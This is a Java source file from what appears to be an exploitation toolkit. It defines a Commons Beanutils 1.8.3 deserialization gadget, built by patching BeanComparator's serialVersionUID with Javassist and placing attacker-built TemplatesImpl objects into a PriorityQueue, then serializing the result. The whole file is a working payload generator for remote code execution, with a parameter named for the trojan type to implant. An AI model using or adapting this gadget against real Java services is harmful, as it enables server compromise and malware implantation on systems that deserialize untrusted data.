package core.gadgets;

import core.enumtypes.PayloadType;
import core.gadgets.utils.Gadgets;
import core.gadgets.utils.JavassistClassLoader;
import core.gadgets.utils.Reflections;
import core.utils.Util;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;

import java.util.Comparator;
import java.util.PriorityQueue;
import java.util.Queue;

public class CommonsBeanutilsString_183  {
    public static Object getObject(PayloadType type, String trojanType) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(type, trojanType);

//        StandardExecutorClassLoader classLoader = new StandardExecutorClassLoader("1.9.2");
//        Class u = classLoader.loadClass("org.apache.commons.beanutils.BeanComparator");
//        System.out.println(u.getPackage());
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
        final CtClass ctBeanComparator = pool.get("org.apache.commons.beanutils.BeanComparator");
        try {
            CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
            ctBeanComparator.removeField(ctSUID);
        }catch (javassist.NotFoundException e){}
        ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
        final Comparator beanComparator = (Comparator)ctBeanComparator.toClass(new JavassistClassLoader()).newInstance();
        ctBeanComparator.defrost();
        Reflections.setFieldValue(beanComparator, "comparator", String.CASE_INSENSITIVE_ORDER);

//        UrlClassLoaderUtils urlClassLoaderUtils = new UrlClassLoaderUtils();
//        Class u = urlClassLoaderUtils.loadJar("").loadClass("org.apache.commons.beanutils.BeanComparator");

//        Object beanComparator = u.getDeclaredConstructor(String.class,Comparator.class).newInstance(null, String.CASE_INSENSITIVE_ORDER);



        PriorityQueue<String> queue = new PriorityQueue(2, (Comparator<?>)beanComparator);

        queue.add("1");
        queue.add("1");

        Reflections.setFieldValue(queue, "queue", new Object[] { templates, templates });

        Reflections.setFieldValue(beanComparator, "property", "outputProperties");
//        Reflections.setFieldValue(beanComparator, "comparator", String.CASE_INSENSITIVE_ORDER);

        return (Queue)queue;
    }

    public static byte[] getByte(PayloadType type, String trojanType) throws Exception {
        Object val = getObject(type, trojanType);
        return Util.serialize(val);
    }
}



